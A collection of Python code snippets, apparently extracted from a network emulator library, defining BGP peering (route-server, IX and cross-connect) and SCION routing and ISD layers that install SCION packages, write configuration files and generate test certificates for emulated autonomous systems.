  "def addCrossConnectPeering(self, a: int, b: int, abRelationship: PeerRelationship = PeerRelationship.Peer) -> Ebgp:\n        \"\"\"!\n        @brief add cross-connect peering.\n\n        @param a First ASN.\n        @param b Second ASN.\n        @param abRelationship (optional) A and B's relationship. If set to\n        PeerRelationship.Provider, A will export everything to B, if set to\n        PeerRelationship.Peer, A will only export own and customer prefixes to\n        B. Default to Peer.\n\n        @throws AssertionError if peering already exist.\n        \n        @returns self, for chaining API calls.\n        \"\"\"\n        assert (a, b) not in self.__xc_peerings, '{} <-> {} already configured as XC peer'.format(a, b)\n        assert (b, a) not in self.__xc_peerings, '{} <-> {} already configured as XC peer'.format(b, a)\n        assert abRelationship == PeerRelationship.Peer or abRelationship == PeerRelationship.Provider or abRelationship == PeerRelationship.Unfiltered, 'unknown peering relationship {}'.format(abRelationship)\n\n        self.__xc_peerings[(a, b)] = abRelationship\n\n        return self",
  "def getCrossConnectPeerings(self) -> Dict[Tuple[int, int], PeerRelationship]:\n        \"\"\"!\n        @brief get cross-connect peerings.\n\n        @returns dict,  where key is tuple of (asnA, asnB) and value is peering relationship.\n        \"\"\"\n        return self.__xc_peerings",
  "def addRsPeer(self, ix: int, peer: int) -> Ebgp:\n        \"\"\"!\n        @brief Setup RS peering for an AS.\n\n        @param ix IXP id.\n        @param peer Participant ASN.\n\n        @throws AssertionError if peering already exist.\n\n        @returns self, for chaining API calls.\n        \"\"\"\n        assert (ix, peer) not in self.__rs_peers, '{} already peered with RS at IX{}'.format(peer, ix)\n\n        self.__rs_peers.append((ix, peer))\n\n        return self",
  "def addRsPeers(self, ix: int, peers: List[int]):\n        \"\"\"!\n        @brief Setup RS peering for list of ASes.\n\n        @param ix IXP id.\n        @param peers List of participant ASNs.\n\n        @throws AssertionError if some peering already exist.\n\n        @returns self, for chaining API calls.\n        \"\"\"\n        for peer in peers:\n            self.addRsPeer(ix, peer)\n\n        return self",
  "def getRsPeers(self) -> List[Tuple[int, int]]:\n        \"\"\"!\n        @brief Get RS peers.\n\n        @returns list of tuple of (ix, peerAsn)\n        \"\"\"\n        return self.__rs_peers",
  "def configure(self, emulator: Emulator) -> None:\n        reg = emulator.getRegistry()\n\n        for (ix, peer) in self.__rs_peers:\n            ix_reg = ScopedRegistry('ix', reg)\n            p_reg = ScopedRegistry(str(peer), reg)\n\n            ix_net: Network = ix_reg.get('net', 'ix{}'.format(ix))\n            ix_rs: Router = ix_reg.get('rs', 'ix{}'.format(ix))\n            rs_ifs = ix_rs.getInterfaces()\n            assert len(rs_ifs) == 1, '??? ix{} rs has {} interfaces.'.format(ix, len(rs_ifs))\n            rs_if = rs_ifs[0]\n\n            p_rnodes: List[Router] = p_reg.getByType('rnode')\n            p_ixnode: Router = None\n            p_ixif: Interface = None\n            for node in p_rnodes:\n                if p_ixnode != None: break\n                for iface in node.getInterfaces():\n                    if iface.getNet() == ix_net:\n                        p_ixnode = node\n                        p_ixif = iface\n                        break\n\n            assert p_ixnode != None, 'cannot resolve peering: as{} not in ix{}'.format(peer, ix)\n            self._log(\"adding peering: {} as {} (RS) <-> {} as {}\".format(rs_if.getAddress(), ix, p_ixif.getAddress(), peer))\n\n            self.__createPeer(ix_rs, p_ixnode, rs_if.getAddress(), p_ixif.getAddress(), PeerRelationship.Peer)\n\n        for (a, b), rel in self.__xc_peerings.items():\n            a_reg = ScopedRegistry(str(a), reg)\n            b_reg = ScopedRegistry(str(b), reg)\n\n            a_router: Router = None\n            b_router: Router = None\n\n            a_addr: str = None\n            b_addr: str = None\n\n            hit = False\n\n            for node in a_reg.getByType('rnode'):\n                router: Router = node\n                for (peername, peerasn), (localaddr, _) in router.getCrossConnects().items():\n                    if peerasn != b: continue\n                    if not b_reg.has('rnode', peername): continue\n\n                    hit = True\n                    a_router = node\n                    b_router = b_reg.get('rnode', peername)\n\n                    a_addr = str(localaddr.ip)\n                    (b_ifaddr, _) = b_router.getCrossConnect(a, a_router.getName())\n                    b_addr = str(b_ifaddr.ip)\n\n                    break\n                if hit: break\n\n            assert hit, 'cannot find XC to configure peer AS{} <--> AS{}'.format(a, b)\n\n            self._log(\"adding XC peering: {} as {} <-({})-> {} as {}\".format(a_addr, a, rel, b_addr, b))\n\n            self.__createPeer(a_router, b_router, a_addr, b_addr, rel)\n\n        for (ix, a, b), rel in self.__peerings.items():\n            ix_reg = ScopedRegistry('ix', reg)\n            a_reg = ScopedRegistry(str(a), reg)\n            b_reg = ScopedRegistry(str(b), reg)\n\n            ix_net: Network = ix_reg.get('net', 'ix{}'.format(ix))\n            a_rnodes: List[Router] = a_reg.getByType('rnode')\n            b_rnodes: List[Router] = b_reg.getByType('rnode')\n\n            a_ixnode: Router = None\n            a_ixif: Interface = None\n            for node in a_rnodes:\n                if a_ixnode != None: break\n                for iface in node.getInterfaces():\n                    if iface.getNet() == ix_net:\n                        a_ixnode = node\n                        a_ixif = iface\n                        break\n            \n            assert a_ixnode != None, 'cannot resolve peering: as{} not in ix{}'.format(a, ix)\n\n            b_ixnode: Router = None\n            b_ixif: Interface = None\n            for node in b_rnodes:\n                if b_ixnode != None: break\n                for iface in node.getInterfaces():\n                    if iface.getNet() == ix_net:\n                        b_ixnode = node\n                        b_ixif = iface\n                        break\n            \n            assert b_ixnode != None, 'cannot resolve peering: as{} not in ix{}'.format(b, ix)\n\n            self._log(\"adding IX peering: {} as {} <-({})-> {} as {}\".format(a_ixif.getAddress(), a, rel, b_ixif.getAddress(), b))\n\n            self.__createPeer(a_ixnode, b_ixnode, a_ixif.getAddress(), b_ixif.getAddress(), rel)",
  "def render(self, emulator: Emulator) -> None:\n        pass",
  "def _doCreateGraphs(self, emulator: Emulator):\n        # creates the following:\n        # - ebgp peering, all ASes in one graph\n        # - ebgp peering, one for each ix\n        # mlpa peer (i.e., via rs): dashed line\n        # private peer: solid line\n\n        full_graph = self._addGraph('All Peering Sessions', False)\n\n        ix_list = set()\n        for (i, _) in self.__rs_peers: ix_list.add(i)\n        for (i, _, _), _ in self.__peerings.items(): ix_list.add(i)\n        for ix in ix_list:\n            self._log('Creating RS peering sessions graph for IX{}...'.format(ix))\n            ix_graph = self._addGraph('IX{} Peering Sessions'.format(ix), False)\n\n            mesh_ases = set()\n            \n            for (i, a) in self.__rs_peers:\n                if i == ix: mesh_ases.add(a)\n            \n            self._log('IX{} RS-mesh: {}'.format(ix, mesh_ases))\n\n            while len(mesh_ases) > 0:\n                a = mesh_ases.pop()\n                if not full_graph.hasVertex('AS{}'.format(a), 'IX{}'.format(ix)):\n                    full_graph.addVertex('AS{}'.format(a), 'IX{}'.format(ix))\n                if not ix_graph.hasVertex('AS{}'.format(a), 'IX{}'.format(ix)):\n                    ix_graph.addVertex('AS{}'.format(a), 'IX{}'.format(ix))\n                for b in mesh_ases:\n                    if not full_graph.hasVertex('AS{}'.format(b), 'IX{}'.format(ix)):\n                        full_graph.addVertex('AS{}'.format(b), 'IX{}'.format(ix))\n                    if not ix_graph.hasVertex('AS{}'.format(b), 'IX{}'.format(ix)):\n                        ix_graph.addVertex('AS{}'.format(b), 'IX{}'.format(ix))\n\n                    full_graph.addEdge('AS{}'.format(a), 'AS{}'.format(b), 'IX{}'.format(ix), 'IX{}'.format(ix), style = 'dashed', alabel = 'R', blabel= 'R')\n                    ix_graph.addEdge('AS{}'.format(a), 'AS{}'.format(b), 'IX{}'.format(ix), 'IX{}'.format(ix), style = 'dashed', alabel = 'R', blabel= 'R')\n                    \n        for (i, a, b), rel in self.__peerings.items():\n            self._log('Creating private peering sessions graph for IX{} AS{} <-> AS{}...'.format(i, a, b))\n\n            ix_graph = self._addGraph('IX{} Peering Sessions'.format(i), False)\n\n            if not full_graph.hasVertex('AS{}'.format(a), 'IX{}'.format(i)):\n                full_graph.addVertex('AS{}'.format(a), 'IX{}'.format(i))\n            if not ix_graph.hasVertex('AS{}'.format(a), 'IX{}'.format(i)):\n                ix_graph.addVertex('AS{}'.format(a), 'IX{}'.format(i))\n\n            if not full_graph.hasVertex('AS{}'.format(b), 'IX{}'.format(i)):\n                full_graph.addVertex('AS{}'.format(b), 'IX{}'.format(i))\n            if not ix_graph.hasVertex('AS{}'.format(b), 'IX{}'.format(i)):\n                ix_graph.addVertex('AS{}'.format(b), 'IX{}'.format(i))\n\n            if rel == PeerRelationship.Peer:\n                full_graph.addEdge('AS{}'.format(a), 'AS{}'.format(b), 'IX{}'.format(i), 'IX{}'.format(i), alabel = 'P', blabel= 'P')\n                ix_graph.addEdge('AS{}'.format(a), 'AS{}'.format(b), 'IX{}'.format(i), 'IX{}'.format(i), alabel = 'P', blabel= 'P')\n\n            if rel == PeerRelationship.Provider:    \n                full_graph.addEdge('AS{}'.format(a), 'AS{}'.format(b), 'IX{}'.format(i), 'IX{}'.format(i), alabel = 'U', blabel = 'C')\n                ix_graph.addEdge('AS{}'.format(a), 'AS{}'.format(b), 'IX{}'.format(i), 'IX{}'.format(i), alabel = 'U', blabel = 'C')\n\n            if rel == PeerRelationship.Unfiltered:\n                full_graph.addEdge('AS{}'.format(a), 'AS{}'.format(b), 'IX{}'.format(i), 'IX{}'.format(i), alabel = 'X', blabel= 'X')\n                ix_graph.addEdge('AS{}'.format(a), 'AS{}'.format(b), 'IX{}'.format(i), 'IX{}'.format(i), alabel = 'X', blabel= 'X')\n\n        # todo: XC peering graphs\n\n        es = list(full_graph.vertices.values())\n        while len(es) > 0:\n            a = es.pop()\n            for b in es:\n                if a.name == b.name:\n                    full_graph.addEdge(a.name, b.name, a.group, b.group, style = 'dotted', alabel = 'I', blabel= 'I')",
  "def print(self, indent: int) -> str:\n        out = ' ' * indent\n        out += 'EbgpLayer:\\n'\n\n        indent += 4\n        for (i, a) in self.__rs_peers:\n            out += ' ' * indent\n            out += 'IX{}: RS <-> AS{}\\n'.format(i, a)\n\n        for (i, a, b), rel in self.__peerings.items():\n            out += ' ' * indent\n            out += 'IX{}: AS{} <--({})--> AS{}\\n'.format(i, a, rel, b)\n\n\n        return out",
  "class ScionRouting(Routing):\n    \"\"\"!\n    @brief Extends the routing layer with SCION inter-AS routing.\n\n    Installs the open-source SCION stack on all hosts and routers. Additionally\n    installs standard SCION test applications (e.g., scion-bwtestclient - a\n    replacement for iperf) on all hosts.\n\n    During layer configuration Router nodes are replaced with ScionRouters which\n    add methods for configuring SCION border router interfaces.\n    \"\"\"\n\n    def configure(self, emulator: Emulator):\n        \"\"\"!\n        @brief Install SCION on router, control service and host nodes.\n        \"\"\"\n        super().configure(emulator)\n\n        reg = emulator.getRegistry()\n        for ((scope, type, name), obj) in reg.getAll().items():\n            if type == 'rnode':\n                rnode: ScionRouter = obj\n                if not issubclass(rnode.__class__, ScionRouter):\n                    rnode.__class__ = ScionRouter\n                    rnode.initScionRouter()\n\n                self.__install_scion(rnode)\n                name = rnode.getName()\n                rnode.appendStartCommand(_CommandTemplates['br'].format(name=name), fork=True)\n\n            elif type == 'csnode':\n                csnode: Node = obj\n                self.__install_scion(csnode)\n                self.__append_scion_command(csnode)\n                name = csnode.getName()\n                csnode.appendStartCommand(_CommandTemplates['cs'].format(name=name), fork=True)\n\n            elif type == 'hnode':\n                hnode: Node = obj\n                self.__install_scion(hnode)\n                self.__append_scion_command(hnode)\n\n    def __install_scion(self, node: Node):\n        \"\"\"Install SCION packages on the node.\"\"\"\n        node.addBuildCommand(\n            'echo \"deb [trusted=yes] https://packages.netsec.inf.ethz.ch/debian all main\"'\n            ' > /etc/apt/sources.list.d/scionlab.list')\n        node.addBuildCommand(\n            \"apt-get update && apt-get install -y\"\n            \" scion-border-router scion-control-service scion-daemon scion-dispatcher scion-tools\"\n            \" scion-apps-bwtester\")\n        node.addSoftware(\"apt-transport-https\")\n        node.addSoftware(\"ca-certificates\")\n\n    def __append_scion_command(self, node: Node):\n        \"\"\"Append commands for starting the SCION host stack on the node.\"\"\"\n        node.appendStartCommand(_CommandTemplates[\"disp\"], fork=True)\n        node.appendStartCommand(_CommandTemplates[\"sciond\"], fork=True)\n\n    def render(self, emulator: Emulator):\n        \"\"\"!\n        @brief Configure SCION routing on router, control service and host\n        nodes.\n        \"\"\"\n        super().render(emulator)\n        reg = emulator.getRegistry()\n        base_layer: ScionBase = reg.get('seedemu', 'layer', 'Base')\n        assert issubclass(base_layer.__class__, ScionBase)\n        isd_layer: ScionIsd = reg.get('seedemu', 'layer', 'ScionIsd')\n\n        reg = emulator.getRegistry()\n        for ((scope, type, name), obj) in reg.getAll().items():\n            if type in ['rnode', 'csnode', 'hnode']:\n                node: Node = obj\n                asn = obj.getAsn()\n                as_: ScionAutonomousSystem = base_layer.getAutonomousSystem(asn)\n                isds = isd_layer.getAsIsds(asn)\n                assert len(isds) == 1, f\"AS {asn} must be a member of exactly one ISD\"\n\n                # Install AS topology file\n                as_topology = as_.getTopology(isds[0][0])\n                node.setFile(\"/etc/scion/topology.json\", json.dumps(as_topology, indent=2))\n\n                self.__provision_base_config(node)\n\n            if type == 'rnode':\n                rnode: ScionRouter = obj\n                self.__provision_router_config(rnode)\n            elif type == 'csnode':\n                csnode: Node = obj\n                self._provision_cs_config(csnode)\n\n    @staticmethod\n    def __provision_base_config(node: Node):\n        \"\"\"Set configuration for sciond and dispatcher.\"\"\"\n\n        node.addBuildCommand(\"mkdir -p /cache\")\n\n        node.setFile(\"/etc/scion/sciond.toml\",\n            _Templates[\"general\"].format(name=\"sd1\") +\n            _Templates[\"trust\"].format(name=\"sd1\") +\n            _Templates[\"path\"].format(name=\"sd1\"))\n\n        node.setFile(\"/etc/scion/dispatcher.toml\", _Templates[\"dispatcher\"])\n\n    @staticmethod\n    def __provision_router_config(router: ScionRouter):\n        \"\"\"Set border router configuration on router nodes.\"\"\"\n\n        name = router.getName()\n        router.setFile(os.path.join(\"/etc/scion/\", name + \".toml\"),\n            _Templates[\"general\"].format(name=name))\n\n    @staticmethod\n    def _provision_cs_config(node: Node):\n        \"\"\"Set control service configuration.\"\"\"\n\n        name = node.getName()\n        node.setFile(os.path.join(\"/etc/scion/\", name + \".toml\"),\n            _Templates[\"general\"].format(name=name) +\n            _Templates[\"trust\"].format(name=name) +\n            _Templates[\"beacon\"].format(name=name) +\n            _Templates[\"path\"].format(name=name))",
  "def configure(self, emulator: Emulator):\n        \"\"\"!\n        @brief Install SCION on router, control service and host nodes.\n        \"\"\"\n        super().configure(emulator)\n\n        reg = emulator.getRegistry()\n        for ((scope, type, name), obj) in reg.getAll().items():\n            if type == 'rnode':\n                rnode: ScionRouter = obj\n                if not issubclass(rnode.__class__, ScionRouter):\n                    rnode.__class__ = ScionRouter\n                    rnode.initScionRouter()\n\n                self.__install_scion(rnode)\n                name = rnode.getName()\n                rnode.appendStartCommand(_CommandTemplates['br'].format(name=name), fork=True)\n\n            elif type == 'csnode':\n                csnode: Node = obj\n                self.__install_scion(csnode)\n                self.__append_scion_command(csnode)\n                name = csnode.getName()\n                csnode.appendStartCommand(_CommandTemplates['cs'].format(name=name), fork=True)\n\n            elif type == 'hnode':\n                hnode: Node = obj\n                self.__install_scion(hnode)\n                self.__append_scion_command(hnode)",
  "def __install_scion(self, node: Node):\n        \"\"\"Install SCION packages on the node.\"\"\"\n        node.addBuildCommand(\n            'echo \"deb [trusted=yes] https://packages.netsec.inf.ethz.ch/debian all main\"'\n            ' > /etc/apt/sources.list.d/scionlab.list')\n        node.addBuildCommand(\n            \"apt-get update && apt-get install -y\"\n            \" scion-border-router scion-control-service scion-daemon scion-dispatcher scion-tools\"\n            \" scion-apps-bwtester\")\n        node.addSoftware(\"apt-transport-https\")\n        node.addSoftware(\"ca-certificates\")",
  "def __append_scion_command(self, node: Node):\n        \"\"\"Append commands for starting the SCION host stack on the node.\"\"\"\n        node.appendStartCommand(_CommandTemplates[\"disp\"], fork=True)\n        node.appendStartCommand(_CommandTemplates[\"sciond\"], fork=True)",
  "def render(self, emulator: Emulator):\n        \"\"\"!\n        @brief Configure SCION routing on router, control service and host\n        nodes.\n        \"\"\"\n        super().render(emulator)\n        reg = emulator.getRegistry()\n        base_layer: ScionBase = reg.get('seedemu', 'layer', 'Base')\n        assert issubclass(base_layer.__class__, ScionBase)\n        isd_layer: ScionIsd = reg.get('seedemu', 'layer', 'ScionIsd')\n\n        reg = emulator.getRegistry()\n        for ((scope, type, name), obj) in reg.getAll().items():\n            if type in ['rnode', 'csnode', 'hnode']:\n                node: Node = obj\n                asn = obj.getAsn()\n                as_: ScionAutonomousSystem = base_layer.getAutonomousSystem(asn)\n                isds = isd_layer.getAsIsds(asn)\n                assert len(isds) == 1, f\"AS {asn} must be a member of exactly one ISD\"\n\n                # Install AS topology file\n                as_topology = as_.getTopology(isds[0][0])\n                node.setFile(\"/etc/scion/topology.json\", json.dumps(as_topology, indent=2))\n\n                self.__provision_base_config(node)\n\n            if type == 'rnode':\n                rnode: ScionRouter = obj\n                self.__provision_router_config(rnode)\n            elif type == 'csnode':\n                csnode: Node = obj\n                self._provision_cs_config(csnode)",
  "def __provision_base_config(node: Node):\n        \"\"\"Set configuration for sciond and dispatcher.\"\"\"\n\n        node.addBuildCommand(\"mkdir -p /cache\")\n\n        node.setFile(\"/etc/scion/sciond.toml\",\n            _Templates[\"general\"].format(name=\"sd1\") +\n            _Templates[\"trust\"].format(name=\"sd1\") +\n            _Templates[\"path\"].format(name=\"sd1\"))\n\n        node.setFile(\"/etc/scion/dispatcher.toml\", _Templates[\"dispatcher\"])",
  "def __provision_router_config(router: ScionRouter):\n        \"\"\"Set border router configuration on router nodes.\"\"\"\n\n        name = router.getName()\n        router.setFile(os.path.join(\"/etc/scion/\", name + \".toml\"),\n            _Templates[\"general\"].format(name=name))",
  "def _provision_cs_config(node: Node):\n        \"\"\"Set control service configuration.\"\"\"\n\n        name = node.getName()\n        node.setFile(os.path.join(\"/etc/scion/\", name + \".toml\"),\n            _Templates[\"general\"].format(name=name) +\n            _Templates[\"trust\"].format(name=name) +\n            _Templates[\"beacon\"].format(name=name) +\n            _Templates[\"path\"].format(name=name))",
  "class ScionIsd(Layer):\n    \"\"\"!\n    @brief SCION AS to ISD relationship layer.\n\n    This layer configures the membership and status as core AS of SCION ASes in\n    SCION Isolation Domains (ISDs). In principle a SCION AS can be a member of\n    multiple ISDs simultaneously with different roles as core or non-core AS in\n    each ISD. This layer's interface reflects that fact by allowing flexible\n    assignment if ASNs to ISDs. In practice however, the current implementation\n    of SCION treats the same ASN in different ISDs as entirely unrelated ASes\n    [1]. Therefore, we restrict ASes to a single ISD for the moment. Assigning\n    an AS to multiple ISDs is detected as an error during rendering.\n\n    [1] [Issue #4293: Overlapping ISDs](https://github.com/scionproto/scion/issues/4293)\n    \"\"\"\n\n    __isd_core: Dict[int, Set[int]]     # Core members (ASNs)\n    __isd_members: Dict[int, Set[int]]  # Non-core members (ASNs)\n    __cert_issuer: Dict[IA, int]\n\n    def __init__(self):\n        super().__init__()\n        self.__isd_core = defaultdict(set)\n        self.__isd_members = defaultdict(set)\n        self.__cert_issuer = {}\n        self.addDependency('Routing', False, False)\n\n    def getName(self) -> str:\n        return \"ScionIsd\"\n\n    def addIsdAs(self, isd: int, asn: int, is_core: bool = False) -> 'ScionIsd':\n        \"\"\"!\n        @brief Add an AS to an ISD.\n\n        @param isd ID of the ISD.\n        @param asn ASN of the AS which joins the ISD.\n        @param is_core Whether the AS becomes a core AS of the ISD.\n\n        @returns self\n        \"\"\"\n        if is_core:\n            self.__isd_core[isd].add(asn)\n        else:\n            self.__isd_members[isd].add(asn)\n\n    def addIsdAses(self, isd: int, core: Iterable[int], non_core: Iterable[int]) -> 'ScionIsd':\n        \"\"\"!\n        @brief Add multiple ASes to an ISD.\n\n        @param isd ID of the ISD.\n        @param core Set of ASes that will join as core ASes.\n        @param non_core Set of ASes that will join as non-core ASes.\n\n        @returns self\n        \"\"\"\n        for asn in core:\n            self.__isd_core[isd].add(asn)\n        for asn in non_core:\n            self.__isd_members[isd].add(asn)\n\n    def getAsIsds(self, asn: int) -> List[Tuple[int, bool]]:\n        \"\"\"!\n        @brief Get the ISDs an AS belongs to.\n\n        @returns Pairs of ISD ids and status as core AS in that ISD.\n        \"\"\"\n        isds = [(isd, True) for isd, ases in self.__isd_core.items() if asn in ases]\n        isds += [(isd, False) for isd, ases in self.__isd_members.items() if asn in ases]\n        return isds\n\n    def isCoreAs(self, isd: int, asn: int) -> bool:\n        \"\"\"!\n        @brief Check if an AS is a core AS in an ISD.\n\n        @param isd ID of the ISD.\n        @param asn ASN of the AS.\n\n        @returns True if the AS is a core AS in the ISD.\n        \"\"\"\n        return asn in self.__isd_core[isd]\n\n    def setCertIssuer(self, as_: IA|Tuple[int, int], issuer: int) -> 'ScionIsd':\n        \"\"\"!\n        @brief Set certificate issuer for a non-core AS. Ignored for core ASes.\n\n        @param as_ AS for which to set the cert issuer.\n        @param issuer ASN of a SCION core as in the same ISD.\n        @return self\n        \"\"\"\n        self.__cert_issuer[IA(*as_)] = issuer\n        return self\n\n    def getCertIssuer(self, as_: IA|Tuple[int, int]) -> Optional[Tuple[int, int]]:\n        \"\"\"!\n        @brief Get the cert issuer for a SCION AS in a certain ISD.\n\n        @param as_ for which to get the cert issuer.\n        @return ASN of the cert issuer or None if not set.\n        \"\"\"\n        return self.__cert_issuer.get(IA(*as_))\n\n    def configure(self, emulator: Emulator) -> None:\n        \"\"\"!\n        @brief Set SCION AS attributes.\n        \"\"\"\n        reg = emulator.getRegistry()\n        base_layer: ScionBase = reg.get('seedemu', 'layer', 'Base')\n        assert issubclass(base_layer.__class__, ScionBase)\n\n        for isd, core in self.__isd_core.items():\n            for asn in core:\n                as_: ScionAutonomousSystem = base_layer.getAutonomousSystem(asn)\n                as_.setAsAttributes(isd, ['core', 'voting', 'authoritative', 'issuing'])\n\n    def render(self, emulator: Emulator) -> None:\n        \"\"\"!\n        @brief Generate crypto material and sign TRCs.\n        \"\"\"\n        reg = emulator.getRegistry()\n        base_layer: ScionBase = reg.get('seedemu', 'layer', 'Base')\n        assert issubclass(base_layer.__class__, ScionBase)\n\n        with TemporaryDirectory(prefix=\"seed_scion\") as tempdir:\n            self.__gen_scion_crypto(base_layer, tempdir)\n            for ((scope, type, name), obj) in reg.getAll().items():\n                if type in ['rnode', 'csnode', 'hnode']:\n                    node: Node = obj\n                    asn = node.getAsn()\n                    as_: ScionAutonomousSystem = base_layer.getAutonomousSystem(asn)\n                    isds = self.getAsIsds(asn)\n                    assert len(isds) == 1, f\"AS {asn} must be a member of exactly one ISD\"\n                    self.__provision_crypto(as_, *isds[0], node, tempdir)\n\n    def print(self, indent: int = 0) -> str:\n        out = ' ' * indent\n        out += 'ScionIsdLayer:\\n'\n\n        indent += 4\n        for isd, core in self.__isd_core.items():\n            out += ' ' * indent\n            out += f'Core ASes of ISD{isd}: {core}\\n'\n\n        for isd, core in self.__isd_members.items():\n            out += ' ' * indent\n            out += f'Non-Core ASes of ISD{isd}: {core}\\n'\n\n        return out\n\n    def __gen_scion_crypto(self, base_layer: ScionBase, tempdir: str):\n        \"\"\"Generate cryptographic material in a temporary directory on the host.\"\"\"\n        topofile = self.__gen_topofile(base_layer, tempdir)\n        self._log(\"Calling scion-pki\")\n        try:\n            result = subprocess.run(\n                [\"scion-pki\", \"testcrypto\", \"-t\", topofile, \"-o\", tempdir, \"--as-validity\", \"30d\"],\n                stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True\n            )\n        except FileNotFoundError:\n            assert False, \"scion-pki not found in PATH\"\n\n        for line in result.stdout.split('\\n'):\n            self._log(line)\n        assert result.returncode == 0, \"scion-pki failed\"\n\n    def __gen_topofile(self, base_layer: ScionBase, tempdir: str) -> str:\n        \"\"\"Generate a standard SCION .topo file representing the emulated network.\"\"\"\n        path = pjoin(tempdir, \"seed.topo\")\n\n        with open(path, 'w') as f:\n            f.write(\"ASes:\\n\")\n            for asn in base_layer.getAsns():\n                as_: ScionAutonomousSystem = base_layer.getAutonomousSystem(asn)\n                isds = self.getAsIsds(asn)\n                isd, is_core = isds[0]\n                assert len(isds) == 1, f\"AS {asn} must be a member of exactly one ISD\"\n\n                f.write(f'  \"{isd}-{asn}\": ')\n                attributes = [f\"'{attrib}': true\" for attrib in as_.getAsAttributes(isd)]\n                if not is_core:\n                    assert (isd, asn) in self.__cert_issuer, f\"non-core AS{asn} does not have a cert issuer in ISD{isd}\"\n                    issuer = self.__cert_issuer[(isd, asn)]\n                    assert issuer in self.__isd_core[isd] and asn in self.__isd_members[isd]\n                    attributes.append(f\"'cert_issuer': {isd}-{issuer}\")\n\n                f.write(\"{{{}}}\\n\".format(\", \".join(attributes)))\n\n        return path\n\n    def __provision_crypto(self, as_: ScionAutonomousSystem, isd: int, is_core: bool, node: Node, tempdir: str):\n        basedir = \"/etc/scion\"\n        asn = as_.getAsn()\n\n        def copyFile(src, dst):\n            # Tempdir will be gone when imports are resolved, therefore we must use setFile\n            with open(src, 'rt', encoding='utf8') as file:\n                content = file.read()\n                # FIXME: The Docker compiler adds an extra newline in generated files\n                # (https://github.com/seed-labs/seed-emulator/issues/125).\n                # SCION does not accept PEM files with an extra newline, so we strip a newline here\n                # that is later added again.\n                if content.endswith('\\n'):\n                    content = content[:-1]\n            node.setFile(dst, content)\n\n        def myImport(name):\n            copyFile(pjoin(tempdir, f\"AS{asn}\", \"crypto\", name), pjoin(basedir, \"crypto\", name))\n\n        if is_core:\n            for kind in [\"sensitive\", \"regular\"]:\n                myImport(pjoin(\"voting\", f\"ISD{isd}-AS{asn}.{kind}.crt\"))\n                myImport(pjoin(\"voting\", f\"{kind}-voting.key\"))\n                myImport(pjoin(\"voting\", f\"{kind}.tmpl\"))\n            for kind in [\"root\", \"ca\"]:\n                myImport(pjoin(\"ca\", f\"ISD{isd}-AS{asn}.{kind}.crt\"))\n                myImport(pjoin(\"ca\", f\"cp-{kind}.key\"))\n                myImport(pjoin(\"ca\", f\"cp-{kind}.tmpl\"))\n        myImport(pjoin(\"as\", f\"ISD{isd}-AS{asn}.pem\"))\n        myImport(pjoin(\"as\", \"cp-as.key\"))\n        myImport(pjoin(\"as\", \"cp-as.tmpl\"))\n\n        #XXX(benthor): trcs need to be known for other isds as well\n        for isd in self.__isd_core.keys():\n            trcname = f\"ISD{isd}-B1-S1.trc\"\n            copyFile(pjoin(tempdir, f\"ISD{isd}\", \"trcs\", trcname), pjoin(basedir, \"certs\", trcname))\n\n        # Master keys are generated only once per AS\n        key0, key1 = as_.getSecretKeys()\n        node.setFile(pjoin(basedir, \"keys\", \"master0.key\"), key0)\n        node.setFile(pjoin(basedir, \"keys\", \"master1.key\"), key1)",
  "def __init__(self):\n        super().__init__()\n        self.__isd_core = defaultdict(set)\n        self.__isd_members = defaultdict(set)\n        self.__cert_issuer = {}\n        self.addDependency('Routing', False, False)",
  "def getName(self) -> str:\n        return \"ScionIsd\"",
  "def addIsdAs(self, isd: int, asn: int, is_core: bool = False) -> 'ScionIsd':\n        \"\"\"!\n        @brief Add an AS to an ISD.\n\n        @param isd ID of the ISD.\n        @param asn ASN of the AS which joins the ISD.\n        @param is_core Whether the AS becomes a core AS of the ISD.\n\n        @returns self\n        \"\"\"\n        if is_core:\n            self.__isd_core[isd].add(asn)\n        else:\n            self.__isd_members[isd].add(asn)",
  "def addIsdAses(self, isd: int, core: Iterable[int], non_core: Iterable[int]) -> 'ScionIsd':\n        \"\"\"!\n        @brief Add multiple ASes to an ISD.\n\n        @param isd ID of the ISD.\n        @param core Set of ASes that will join as core ASes.\n        @param non_core Set of ASes that will join as non-core ASes.\n\n        @returns self\n        \"\"\"\n        for asn in core:\n            self.__isd_core[isd].add(asn)\n        for asn in non_core:\n            self.__isd_members[isd].add(asn)",
  "def getAsIsds(self, asn: int) -> List[Tuple[int, bool]]:\n        \"\"\"!\n        @brief Get the ISDs an AS belongs to.\n\n        @returns Pairs of ISD ids and status as core AS in that ISD.\n        \"\"\"\n        isds = [(isd, True) for isd, ases in self.__isd_core.items() if asn in ases]\n        isds += [(isd, False) for isd, ases in self.__isd_members.items() if asn in ases]\n        return isds",
  "def isCoreAs(self, isd: int, asn: int) -> bool:\n        \"\"\"!\n        @brief Check if an AS is a core AS in an ISD.\n\n        @param isd ID of the ISD.\n        @param asn ASN of the AS.\n\n        @returns True if the AS is a core AS in the ISD.\n        \"\"\"\n        return asn in self.__isd_core[isd]",
  "def setCertIssuer(self, as_: IA|Tuple[int, int], issuer: int) -> 'ScionIsd':\n        \"\"\"!\n        @brief Set certificate issuer for a non-core AS. Ignored for core ASes.\n\n        @param as_ AS for which to set the cert issuer.\n        @param issuer ASN of a SCION core as in the same ISD.\n        @return self\n        \"\"\"\n        self.__cert_issuer[IA(*as_)] = issuer\n        return self",
  "def getCertIssuer(self, as_: IA|Tuple[int, int]) -> Optional[Tuple[int, int]]:\n        \"\"\"!\n        @brief Get the cert issuer for a SCION AS in a certain ISD.\n\n        @param as_ for which to get the cert issuer.\n        @return ASN of the cert issuer or None if not set.\n        \"\"\"\n        return self.__cert_issuer.get(IA(*as_))",
  "def configure(self, emulator: Emulator) -> None:\n        \"\"\"!\n        @brief Set SCION AS attributes.\n        \"\"\"\n        reg = emulator.getRegistry()\n        base_layer: ScionBase = reg.get('seedemu', 'layer', 'Base')\n        assert issubclass(base_layer.__class__, ScionBase)\n\n        for isd, core in self.__isd_core.items():\n            for asn in core:\n                as_: ScionAutonomousSystem = base_layer.getAutonomousSystem(asn)\n                as_.setAsAttributes(isd, ['core', 'voting', 'authoritative', 'issuing'])",
